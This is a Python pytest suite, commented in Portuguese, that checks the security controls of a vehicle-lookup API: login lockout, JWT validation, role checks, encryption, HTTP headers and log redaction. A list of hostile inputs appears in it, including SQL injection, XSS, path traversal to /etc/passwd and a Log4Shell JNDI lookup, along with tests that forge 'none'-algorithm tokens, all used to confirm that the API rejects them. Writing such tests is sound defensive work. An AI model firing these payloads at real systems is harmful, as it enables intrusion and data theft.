"""
Testes de segurança da API — Sprint 3 (DevSecOps).
Cada teste referencia o controle e a ameaça (STRIDE / OWASP) que ele comprova.
"""
import json
import logging
import time
import uuid
from datetime import datetime, timedelta, timezone

import jwt
import pytest

import main
from conftest import ADMIN, ANALISTA, auth

RAPTOR = {"marca": "Ford", "modelo": "Ranger", "versao": "Raptor"}


def _token_forjado(**over):
    agora = datetime.now(timezone.utc)
    p = {"sub": "admin", "role": "admin", "iss": main.JWT_ISSUER, "aud": main.JWT_AUDIENCE,
         "iat": agora, "nbf": agora, "exp": agora + timedelta(minutes=5), "jti": uuid.uuid4().hex}
    p.update(over)
    return p


# ---------------------------------------------------------------- Autenticação
class TestAutenticacao:
    def test_login_valido_retorna_token_e_role(self, client):
        r = client.post("/login", json={"usuario": ANALISTA[0], "senha": ANALISTA[1]})
        assert r.status_code == 200
        corpo = r.json()
        assert corpo["role"] == "analista" and corpo["expires_in"] == 900

    def test_senha_errada_e_usuario_inexistente_tem_resposta_identica(self, client):
        a = client.post("/login", json={"usuario": "analista", "senha": "errada-errada-1"})
        b = client.post("/login", json={"usuario": "fantasma", "senha": "errada-errada-1"})
        assert a.status_code == b.status_code == 401
        assert a.json() == b.json()  # sem enumeração de usuários (ASVS 2.2.1)

    def test_bloqueio_apos_5_falhas_mesmo_com_senha_correta(self, client):
        for _ in range(main.MAX_FALHAS):
            assert client.post("/login", json={"usuario": "admin", "senha": "x-errada-123"}).status_code == 401
        r = client.post("/login", json={"usuario": ADMIN[0], "senha": ADMIN[1]})
        assert r.status_code == 429 and "Retry-After" in r.headers

    def test_rate_limit_por_ip_no_login(self, client):
        codigos = [client.post("/login", json={"usuario": f"u{i}", "senha": "qualquer-coisa"}).status_code
                   for i in range(12)]
        assert 429 in codigos and codigos[0] == 401

    def test_senha_nao_e_armazenada_em_texto_puro(self):
        for u in main.USUARIOS.values():
            assert u["hash"].startswith("$argon2id$")
            assert ANALISTA[1] not in json.dumps(main.USUARIOS) and ADMIN[1] not in json.dumps(main.USUARIOS)


# ---------------------------------------------------------------- JWT
class TestJWT:
    def test_sem_token_401(self, client):
        r = client.post("/buscar", json=RAPTOR)
        assert r.status_code == 401 and r.headers["WWW-Authenticate"] == "Bearer"

    def test_token_adulterado_401(self, client, token_analista):
        adulterado = token_analista[:-4] + ("AAAA" if not token_analista.endswith("AAAA") else "BBBB")
        assert client.post("/buscar", json=RAPTOR, headers=auth(adulterado)).status_code == 401

    def test_token_expirado_401(self, client):
        t = jwt.encode(_token_forjado(exp=datetime.now(timezone.utc) - timedelta(minutes=10)),
                       main.JWT_SECRET, algorithm="HS256")
        assert client.post("/buscar", json=RAPTOR, headers=auth(t)).status_code == 401

    def test_algoritmo_none_rejeitado(self, client):
        t = jwt.encode(_token_forjado(), key=None, algorithm="none")
        assert client.get("/admin/historico", headers=auth(t)).status_code == 401

    def test_assinatura_com_outra_chave_rejeitada(self, client):
        t = jwt.encode(_token_forjado(), "outra-chave-qualquer-com-mais-de-32-bytes!!", algorithm="HS256")
        assert client.get("/admin/historico", headers=auth(t)).status_code == 401

    @pytest.mark.parametrize("campo,valor", [("aud", "outro-app"), ("iss", "atacante")])
    def test_audience_e_issuer_verificados(self, client, campo, valor):
        t = jwt.encode(_token_forjado(**{campo: valor}), main.JWT_SECRET, algorithm="HS256")
        assert client.get("/veiculos", headers=auth(t)).status_code == 401

    def test_token_sem_jti_rejeitado(self, client):
        p = _token_forjado()
        p.pop("jti")
        t = jwt.encode(p, main.JWT_SECRET, algorithm="HS256")
        assert client.get("/veiculos", headers=auth(t)).status_code == 401

    def test_logout_revoga_token(self, client, token_analista):
        assert client.get("/veiculos", headers=auth(token_analista)).status_code == 200
        assert client.post("/logout", headers=auth(token_analista)).status_code == 200
        assert client.get("/veiculos", headers=auth(token_analista)).status_code == 401


# ---------------------------------------------------------------- Autorização (RBAC)
class TestAutorizacao:
    def test_analista_nao_acessa_rotas_admin(self, client, token_analista):
        assert client.get("/admin/historico", headers=auth(token_analista)).status_code == 403
        r = client.post("/admin/teste-criptografia", json={"dado": "x"}, headers=auth(token_analista))
        assert r.status_code == 403

    def test_admin_acessa_historico_descriptografado(self, client, token_analista, token_admin):
        client.post("/buscar", json=RAPTOR, headers=auth(token_analista))
        r = client.get("/admin/historico", headers=auth(token_admin))
        assert r.status_code == 200
        item = r.json()["historico"][0]
        assert item["usuario"] == "analista" and item["modelo"] == "Ranger"

    def test_metricas_exigem_token_proprio(self, client, token_admin):
        assert client.get("/metrics").status_code == 401
        assert client.get("/metrics", headers=auth(token_admin)).status_code == 401  # JWT de usuário não serve
        r = client.get("/metrics", headers=auth(main.METRICS_TOKEN))
        assert r.status_code == 200 and "ford_security_events_total" in r.text


# ---------------------------------------------------------------- Validação de entrada
PAYLOADS_MALICIOSOS = [
    "Ford'; DROP TABLE veiculos;--",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "../../etc/passwd",
    "${jndi:ldap://atacante/x}",
    "Ford\nX-Injected: 1",
    "A" * 51,
]


class TestValidacao:
    @pytest.mark.parametrize("payload", PAYLOADS_MALICIOSOS)
    def test_payloads_maliciosos_sao_rejeitados(self, client, token_analista, payload):
        r = client.post("/buscar", json={**RAPTOR, "marca": payload}, headers=auth(token_analista))
        assert r.status_code == 422
        assert payload not in r.text  # não reflete a entrada

    def test_campos_extras_rejeitados(self, client, token_analista):
        r = client.post("/buscar", json={**RAPTOR, "role": "admin"}, headers=auth(token_analista))
        assert r.status_code == 422

    def test_atributos_invalidos_rejeitados(self, client, token_analista):
        r = client.post("/buscar", json={**RAPTOR, "atributos": ["<img>"]}, headers=auth(token_analista))
        assert r.status_code == 422

    def test_busca_valida_e_filtro_de_atributos(self, client, token_analista):
        r = client.post("/buscar", json={**RAPTOR, "atributos": ["potencia", "PRECO", "inexistente"]},
                        headers=auth(token_analista))
        assert r.status_code == 200
        assert r.json() == {"potencia": "397cv @ 5650 RPM", "preco": "R$ 499.000", "inexistente": "não disponível"}

    def test_busca_completa_retorna_10_campos(self, client, token_analista):
        r = client.post("/buscar", json=RAPTOR, headers=auth(token_analista))
        assert r.status_code == 200 and len(r.json()) == 10

    def test_veiculo_inexistente_404(self, client, token_analista):
        r = client.post("/buscar", json={**RAPTOR, "modelo": "Mustang"}, headers=auth(token_analista))
        assert r.status_code == 404


# ---------------------------------------------------------------- Criptografia
class TestCriptografia:
    def test_historico_fica_criptografado_em_repouso(self, client, token_analista):
        client.post("/buscar", json=RAPTOR, headers=auth(token_analista))
        bruto = json.dumps(list(main.HISTORICO))
        assert "Ranger" not in bruto and "analista" not in bruto and "gAAAA" in bruto

    def test_rotacao_de_chaves_preserva_dados_antigos(self):
        from cryptography.fernet import Fernet, MultiFernet
        antiga, nova = Fernet(Fernet.generate_key()), Fernet(Fernet.generate_key())
        dado = antiga.encrypt(b"legado")
        assert MultiFernet([nova, antiga]).decrypt(dado) == b"legado"  # nova encripta, ambas decriptam

    def test_endpoint_de_teste_via_post(self, client, token_admin):
        r = client.post("/admin/teste-criptografia", json={"dado": "senha_secreta_123"}, headers=auth(token_admin))
        assert r.status_code == 200 and r.json()["funciona"] is True
        assert client.get("/admin/teste-criptografia?dado=x", headers=auth(token_admin)).status_code == 405


# ---------------------------------------------------------------- Cabeçalhos, CORS, erros
class TestHardeningHTTP:
    def test_cabecalhos_de_seguranca(self, client):
        h = client.get("/health").headers
        assert h["x-content-type-options"] == "nosniff" and h["x-frame-options"] == "DENY"
        assert "frame-ancestors 'none'" in h["content-security-policy"]
        assert h["cache-control"] == "no-store" and h["referrer-policy"] == "no-referrer"
        assert len(h["x-request-id"]) == 16

    def test_cors_somente_origem_permitida(self, client):
        ok = client.get("/health", headers={"Origin": "http://localhost:3000"})
        ruim = client.get("/health", headers={"Origin": "http://evil.example"})
        assert ok.headers.get("access-control-allow-origin") == "http://localhost:3000"
        assert "access-control-allow-origin" not in ruim.headers
        assert "access-control-allow-credentials" not in ok.headers

    def test_erro_interno_nao_vaza_detalhes(self, client, token_analista, monkeypatch):
        def quebra(_):
            raise RuntimeError("segredo-interno-do-servidor")
        monkeypatch.setattr(main, "criptografar", quebra)
        r = client.post("/buscar", json=RAPTOR, headers=auth(token_analista))
        assert r.status_code == 500
        assert "segredo-interno" not in r.text and "request_id" in r.json()


# ---------------------------------------------------------------- Logs
class TestLogs:
    def test_logs_sao_json_e_nao_vazam_segredos(self, client):
        class Coletor(logging.Handler):
            """Formata no momento da emissão (dentro do contexto da requisição)."""
            def __init__(self):
                super().__init__()
                self.linhas = []

            def emit(self, record):
                self.linhas.append(json.loads(main.JsonFormatter().format(record)))

        coletor = Coletor()
        main.logger.addHandler(coletor)
        try:
            client.post("/login", json={"usuario": "admin", "senha": "tentativa-errada-1"})
            tok = client.post("/login", json={"usuario": ADMIN[0], "senha": ADMIN[1]}).json()["access_token"]
            client.post("/buscar", json=RAPTOR, headers=auth(tok))
        finally:
            main.logger.removeHandler(coletor)
        linhas = coletor.linhas
        assert {"LOGIN_FAILURE", "LOGIN_SUCCESS", "SEARCH"} <= {l["event"] for l in linhas}
        bruto = json.dumps(linhas)
        for segredo in ("tentativa-errada-1", ADMIN[1], tok, main.JWT_SECRET):
            assert segredo not in bruto
        assert "admin@ford.com" not in bruto and "a****@ford.com" in bruto  # e-mail anonimizado (LGPD)
        assert all(l["request_id"] != "-" for l in linhas)  # todo log é correlacionável

    def test_configuracao_fraca_impede_a_inicializacao(self, monkeypatch):
        monkeypatch.setenv("JWT_SECRET", "curta")
        with pytest.raises(main.ConfigError):
            main._segredo("JWT_SECRET", 32)
        monkeypatch.setenv("JWT_SECRET", "TROQUE_ME" + "x" * 40)
        with pytest.raises(main.ConfigError):
            main._segredo("JWT_SECRET", 32)
